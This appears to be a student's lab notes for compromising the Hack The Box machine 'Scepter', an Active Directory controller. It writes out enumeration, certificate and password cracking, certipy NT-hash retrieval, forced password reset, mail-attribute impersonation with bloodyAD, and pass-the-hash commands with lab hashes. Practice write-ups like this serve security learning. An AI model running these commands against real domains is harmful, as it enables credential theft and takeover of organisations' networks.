Using orangesecurity mindmap to get going: https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg

nmap -Pn -sC -sV -p- -oA nmap.txt scepter.htb
smbmap -H 10.10.11.65
- No shares found cuz no auth :(
- nmap command took forever so ran nmap -sV scepter.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-17 08:54:20Z)
111/tcp  open  rpcbind?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

RPC is open so rpcclient can be used?
rpcclient -U "" 10.10.11.65 -N 

Attempting to run enumdomusers but access denied. 
Not much else to do here but will leave rpc shell open.

Running enum4linux: enum4linux dc.scepter.htb
- Only found domain Sid: S-1-5-21-74879546-916818434-740295365

nxc smb scepter.htb -u '' -p '' -M spider_plus
- Permission denied.

Also went ahead and modified krb5.conf to this:

[domain_realm]
    .scepter.htb = SCEPTER.HTB
    scepter.htb = SCEPTER.HTB

[libdefaults]
    default_realm = SCEPTER.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true
    forwardable = true

[realms]
    FRIZZ.HTB = {
        kdc = dc.scepter.htb
        admin_server = dc.scepter.htb
        default_domain = scepter.htb
    }

nxc ldap scepter.htb -u '' -p '' --trusted-for-delegation --password-not-required --admin-count --users --groups
- Shows a bunch of errors. The assumption to be made is that we are denied access still.

sudo faketime "$(ntpdate -q scepter.htb | awk '{print $1" "$2}')" nxc ldap dc.scepter.htb -k -u '' -p '' --trusted-for-delegation --password-not-required --admin-count --users --groups
- Still doesn't work.

sudo faketime "$(ntpdate -q scepter.htb | awk '{print $1" "$2}')" nxc smb dc.scepter.htb -u '' -p '' --groups --local-groups --loggedon-users --rid-brute --users --shares --pass-pol
- Also doesn't work.

Next step is timeroast because we can: nxc smb -M timeroast dc.scepter.htb
- 1000:$sntp-ms$6c00993f2f1f2d3f030c8b6b73866aad$1c0111e900000000000a56184c4f434cec22cd19a46d67e2e1b8428bffbfcd0aec233e9ae46d5c23ec233e9ae46d71f3

Awesome sauce, first crack it, then RID brute. If we do get creds, then we will try to bloodhound.
- Performing unconstrained delegation against Chroma_svc to access hashcat to crack sntp on behalf of nubb domain user.
- Couldn't crack. L bozo

Chroma noticed that 2049 is open, which is an NFS server. Think of it like a file share where users access file remotely as if they are on local storage. We can check for such with: showmount -a scepter.htb
- 10.10.10.40:/helpdesk
- This is good. Notice that the NFS server IP is different from the DC. We can mount with: 
	- sudo apt install nfs-common
	- sudo mkdir /tmp/helpdesk
	- sudo mount -t nfs 10.10.11.65:/helpdesk /tmp/helpdesk
	- NOTE: The IPs from showmount doesn't match for whatev reason. The NFS server is ofc on the DC lol.

sudo ls -ls mnt:

-rwx------  1 nobody nogroup 2484 Nov  1  2024 baker.crt
-rwx------  1 nobody nogroup 2029 Nov  1  2024 baker.key
-rwx------  1 nobody nogroup 3315 Nov  1  2024 clark.pfx
-rwx------  1 nobody nogroup 3315 Nov  1  2024 lewis.pfx
-rwx------  1 nobody nogroup 3315 Nov  1  2024 scott.pfx

Let's see if we can crack these .pfx files? We can actually use pfx2john!
- sudo -i 
- cd /tmp/helpdesk
- sudo cp * /home/kali/HTB/Scepter (go back to Scepter dir now)
- sudo pfx2john lewis.pfx > lewis.txt 
- Edit the hash file; remove lewis.pfx and colons from start/end of file
- john --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx lewis.txt

Cracked! The password retrieved is: newpassword 
Repeating this process for the other files shows:
Lewis password: newpassword
Clark password: newpassword
Scott password: newpassword

Now for baker.crt/.key, we can first verify that the two are paired together for authentication with:
- sudo openssl x509 -noout -modulus -in baker.crt | openssl md5
- sudo openssl rsa -noout -modulus -in baker.key | openssl md5

We are able to get an MD5 hash of the .crt: 8dea00a61b4567f92dfc79954bbbb610

--- lots of failures during this time lol, skipping ahead

Referenced the writeup and saw that yes, we can make a .crt file for baker w/ the key and crt file lol.
- The password is, somehow, newpassword? The assumption to make is that since it's the same for all of them, that it'll be the same for him maybe? Idk. Wild stuff.
- sudo openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt -passout pass: (enter newpassword)

Wowza that worked lol. Now we can use certipy to get an NTLM hash for the user and crack it to reveal their plaintext password!
- certipy auth -pfx baker.pfx -dc-ip 10.10.11.65

Had to go activate python env to run certipy bruh, just use certipy-ad:
- certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65

Didn't work and also gave us some dumb error garbage. Decided to remount the server and redo the certificate building w/ sudo -i.

(still in interactive sudo terminal w/ sudo =i, run sudo for most commands or just run sudo -i)

Back to certificate building:
- sudo openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt -passout pass: (enter newpassword)
- chmod 777 baker.pfx
- certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65

Got clock skew so time to faketime:
- faketime "$(ntpdate -q scepter.htb | awk '{print $1" "$2}')" certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce

NOTE: LM hash in the first bit, NT hash is second bit. Colon is delimiter.
Sweet! Now cracking time:
- echo "18b5fb0d99e7a475316213c15b6f22ce" > bakerhash.txt
- hashcat -m 1000 -a 0 bakerhash.txt /usr/share/wordlists/rockyou.txt

Couldn't crack, so we just continue on.
We can bloodhound w/ this hash by passing it with the --hashes option:
- sudo bloodhound-python -d scepter.htb -u 'd.baker' -hashes "aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce" -c all -ns 10.10.11.65

Awesome, time to graph everything.

From the graph, we can see:
- d.baker has ForceChangePassword over a.carter.
- d.baker is a member of the Staff group
	- Staff group doesn't do anything tho so whatev
- a.carter is a member of the IT SUPPORT group which has GenericAll over the Staff Access Certificate OU.
- p.adams user can DCSync?????? Not an administrator either.

Next step is force change password for carter, then abuse the OU:
- changepasswd.py 'scepter.htb'/'a.carter'@10.10.11.65 -reset -altuser 'd.baker' -althash '18b5fb0d99e7a475316213c15b6f22ce'

Worked! a.carter passwor is newpass now. You can enter whatever password you want tho.

Writeup showed that they modified mail to impersonate h.brown; member of remote management. Will instead attempt to find a vector thru Certipy:
- certipy-ad find -u a.carter@scepter.htb -p 'newpass' -dc-ip 10.10.11.65 -vulnerable -stdout
- CA Name: scepter-DC01-CA, DNS Name: dc01.scepter.htb

Nothing to exploit here. Next step really is to exploit the OU then.
Looking through bloodhound, p.adams can replicate the entire domain; a DCSync is possible!

--- Appears we can't touch this user in any aspect. Attempting to change mail attribute for baker and request+auth w/ Certipy doesn't work

Reverting back to writeup, let's see if we can impersonate brown. Recall that we need to give carter GenericAll over the OU first:
- bloodyAD -d scepter.htb -u a.carter -p 'newpass' --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
- bloodyAD -d scepter.htb -u a.carter -p 'newpass' --host dc.scepter.htb --dc-ip 10.10.11.65 set object d.baker mail -v h.brown@scepter.htb

Worked. Now get authentication:
- certipy-ad req -username "d.baker@scepter.htb" -hashes aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce -target dc.scepter.htb -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
- sudo faketime "$(ntpdate -q scepter.htb | awk '{print $1" "$2}')" certipy-ad auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown
[*] Saving credential cache to 'h.brown.ccache'
[*] Wrote credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c

Sweet. NTLM hash is 4ecf5242092c6fb8c360a08069c75a0c. We can now get user on DC (brown in remote management user group) w/ evil-winrm and PTH:
- evil-winrm -i dc.scepter.htb -u h.brown -H 4ecf5242092c6fb8c360a08069c75a0c

Not working for some reason

--- Went back to square one and enumerated again
nxc smb 10.10.11.65 -u a.carter -p 'newpass' --rid-brute                                                                  
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.65     445    DC01             [+] scepter.htb\a.carter:newpass 
SMB         10.10.11.65     445    DC01             498: SCEPTER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.65     445    DC01             500: SCEPTER\Administrator (SidTypeUser)
SMB         10.10.11.65     445    DC01             501: SCEPTER\Guest (SidTypeUser)
SMB         10.10.11.65     445    DC01             502: SCEPTER\krbtgt (SidTypeUser)
SMB         10.10.11.65     445    DC01             512: SCEPTER\Domain Admins (SidTypeGroup)
SMB         10.10.11.65     445    DC01             513: SCEPTER\Domain Users (SidTypeGroup)
SMB         10.10.11.65     445    DC01             514: SCEPTER\Domain Guests (SidTypeGroup)
SMB         10.10.11.65     445    DC01             515: SCEPTER\Domain Computers (SidTypeGroup)
SMB         10.10.11.65     445    DC01             516: SCEPTER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.65     445    DC01             517: SCEPTER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.65     445    DC01             518: SCEPTER\Schema Admins (SidTypeGroup)
SMB         10.10.11.65     445    DC01             519: SCEPTER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.65     445    DC01             520: SCEPTER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.65     445    DC01             521: SCEPTER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.65     445    DC01             522: SCEPTER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.65     445    DC01             525: SCEPTER\Protected Users (SidTypeGroup)
SMB         10.10.11.65     445    DC01             526: SCEPTER\Key Admins (SidTypeGroup)
SMB         10.10.11.65     445    DC01             527: SCEPTER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.65     445    DC01             553: SCEPTER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.65     445    DC01             571: SCEPTER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.65     445    DC01             572: SCEPTER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.65     445    DC01             1000: SCEPTER\DC01$ (SidTypeUser)
SMB         10.10.11.65     445    DC01             1101: SCEPTER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.65     445    DC01             1102: SCEPTER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.65     445    DC01             1103: SCEPTER\staff (SidTypeGroup)
SMB         10.10.11.65     445    DC01             1104: SCEPTER\IT Support (SidTypeGroup)
SMB         10.10.11.65     445    DC01             1105: SCEPTER\Helpdesk Admins (SidTypeGroup)
SMB         10.10.11.65     445    DC01             1106: SCEPTER\d.baker (SidTypeUser)
SMB         10.10.11.65     445    DC01             1107: SCEPTER\a.carter (SidTypeUser)
SMB         10.10.11.65     445    DC01             1108: SCEPTER\h.brown (SidTypeUser)
SMB         10.10.11.65     445    DC01             1109: SCEPTER\p.adams (SidTypeUser)
SMB         10.10.11.65     445    DC01             1111: SCEPTER\Replication Operators (SidTypeGroup)
SMB         10.10.11.65     445    DC01             1601: SCEPTER\CMS (SidTypeGroup)
SMB         10.10.11.65     445    DC01             2101: SCEPTER\e.lewis (SidTypeUser)
SMB         10.10.11.65     445    DC01             2102: SCEPTER\o.scott (SidTypeUser)
SMB         10.10.11.65     445    DC01             2103: SCEPTER\M.clark (SidTypeUser)

DC01 had that sntp hash from the beginning lol

Bloodhound again but with carter:
- sudo bloodhound-python -d scepter.htb -u 'a.carter' -p 'newpass' -c all -ns 10.10.11.65
